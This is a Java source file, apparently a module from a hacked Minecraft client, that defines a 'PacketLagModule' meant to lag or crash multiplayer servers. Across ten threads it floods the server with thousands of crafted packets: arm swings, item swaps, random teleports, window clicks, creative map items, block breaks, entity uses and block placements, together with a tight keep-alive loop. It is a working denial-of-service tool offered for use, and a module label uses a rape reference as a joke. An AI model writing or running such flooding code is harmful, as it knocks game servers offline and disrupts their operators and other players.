package net.wheel.cutils.impl.module.CRACK;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.inventory.GuiContainer;
import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.entity.Entity;
import net.minecraft.entity.item.EntityArmorStand;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.inventory.Container;
import net.minecraft.item.ItemStack;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.*;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;

import net.wheel.cutils.api.event.EventStageable;
import net.wheel.cutils.api.event.minecraft.EventDisplayGui;
import net.wheel.cutils.api.event.player.EventPlayerUpdate;
import net.wheel.cutils.api.module.Module;
import net.wheel.cutils.api.value.Value;

import hand.interactor.voodoo.impl.annotated.handler.annotation.Listener;

public final class PacketLagModule extends Module {

    public final Value<Mode> mode = new Value<>("Mode", new String[] { "Mode", "M" }, "l@g", Mode.BOXER);
    public final Value<Integer> packets = new Value<>("Packets", new String[] { "pckts", "packet" }, "amt of packets",
            1000, 0, 10000, 1);
    public final Value<Integer> delay = new Value<>("Delay", new String[] { "del" }, "thread sleep (in ms)", 10, 0, 100,
            1);

    private Container lastContainer = null;

    private final ExecutorService packetExecutor = Executors.newFixedThreadPool(10);
    private final ExecutorService slaveExecutor = Executors.newSingleThreadExecutor();

    public PacketLagModule() {
        super("PacketLagModule", new String[] { "Lag" }, "r@pe", "NONE", -1, ModuleType.CRACK);
    }

    @Override
    public String getMetaData() {
        return this.mode.getValue().name();
    }

    @Listener
    public void onUpdate(EventPlayerUpdate event) {
        if (event.getStage() == EventStageable.EventStage.PRE) {
            final Minecraft mc = Minecraft.getMinecraft();
            if (mc.player == null || mc.world == null) {
                return;
            }

            packetExecutor.execute(() -> {
                try {
                    packetTasker(mc);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            });

            if (!slaveExecutor.isShutdown()) {
                slaveExecutor.execute(() -> runSlaveConnection(mc));
            }
        }
    }

    private void packetTasker(Minecraft mc) throws InterruptedException {
        switch (this.mode.getValue()) {
            case BOXER:
                releasePackets(mc, new CPacketAnimation(EnumHand.MAIN_HAND), packets.getValue());
                break;
            case SWAP:
                releasePackets(mc, new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS,
                        BlockPos.ORIGIN, mc.player.getHorizontalFacing()), packets.getValue());
                break;
            case RANDOM_TELEPORT:
                for (int i = 0; i <= packets.getValue(); i++) {
                    double offsetX = Math.random() * 100 - 200;
                    double offsetZ = Math.random() * 100 - 200;
                    mc.player.connection.sendPacket(new CPacketPlayer.Position(mc.player.posX + offsetX, mc.player.posY,
                            mc.player.posZ + offsetZ, false));
                }
                break;
            case WINDOW_CLICK_SPAM:
                for (int i = 0; i <= packets.getValue(); i++) {
                    mc.player.connection.sendPacket(new CPacketClickWindow(mc.player.openContainer.windowId, i % 36, 0,
                            ClickType.QUICK_MOVE, ItemStack.EMPTY, (short) 0));
                }
                break;
            case FAKE_MOVEMENT:
                releasePackets(mc, new CPacketPlayer.PositionRotation(mc.player.posX, mc.player.posY + 1337,
                        mc.player.posZ, mc.player.rotationYaw, mc.player.rotationPitch, false), packets.getValue());
                break;
            case MULTI_MAP:
                for (int i = 0; i <= packets.getValue(); i++) {
                    ItemStack mapItem = new ItemStack(Items.FILLED_MAP, 1, i);
                    mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(0, mapItem));
                }
                break;
            case BLOCK_BREAK:
                BlockPos targetPos = mc.player.getPosition().down();
                releasePackets(mc, new CPacketPlayerDigging(CPacketPlayerDigging.Action.START_DESTROY_BLOCK, targetPos,
                        EnumFacing.UP), packets.getValue() / 2);
                releasePackets(mc, new CPacketPlayerDigging(CPacketPlayerDigging.Action.STOP_DESTROY_BLOCK, targetPos,
                        EnumFacing.UP), packets.getValue() / 2);
                break;
            case ENTITY_SPAWN:
                for (Entity entity : mc.world.loadedEntityList) {
                    if (entity instanceof EntityArmorStand) {
                        releasePackets(mc, new CPacketUseEntity(entity, EnumHand.MAIN_HAND), packets.getValue());
                    }
                }
                break;
            case BLOCK_PLACE:
                releasePackets(mc, new CPacketPlayerTryUseItemOnBlock(mc.player.getPosition(), EnumFacing.UP,
                        EnumHand.MAIN_HAND, 0, 0, 0), packets.getValue());
                break;
        }
    }

    private void releasePackets(Minecraft mc, Packet<?> packet, int times) throws InterruptedException {
        for (int i = 0; i < times; i++) {
            mc.player.connection.sendPacket(packet);
            if (i % 100 == 0) {
                Thread.sleep(delay.getValue());
            }
        }
    }

    private void runSlaveConnection(Minecraft mc) {
        while (!Thread.currentThread().isInterrupted()) {
            if (mc.player != null && mc.player.connection != null) {
                mc.player.connection.getNetworkManager().sendPacket(new CPacketKeepAlive(System.currentTimeMillis()));
                try {
                    TimeUnit.MILLISECONDS.sleep(50);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
        }
    }

    @Listener
    public void onDisplayGui(EventDisplayGui event) {
        if (event.getScreen() != null) {
            if (this.mode.getValue().equals(Mode.CONTAINER)) {
                if (!(event.getScreen() instanceof GuiInventory) && event.getScreen() instanceof GuiContainer) {
                    GuiContainer guiContainer = (GuiContainer) event.getScreen();
                    this.lastContainer = guiContainer.inventorySlots;
                    event.setCanceled(true);
                }
            }
        }
    }

    private enum Mode {
        BOXER, SWAP, RANDOM_TELEPORT, WINDOW_CLICK_SPAM, FAKE_MOVEMENT, MULTI_MAP, BLOCK_BREAK, ENTITY_SPAWN,
        BLOCK_PLACE, CONTAINER
    }
}
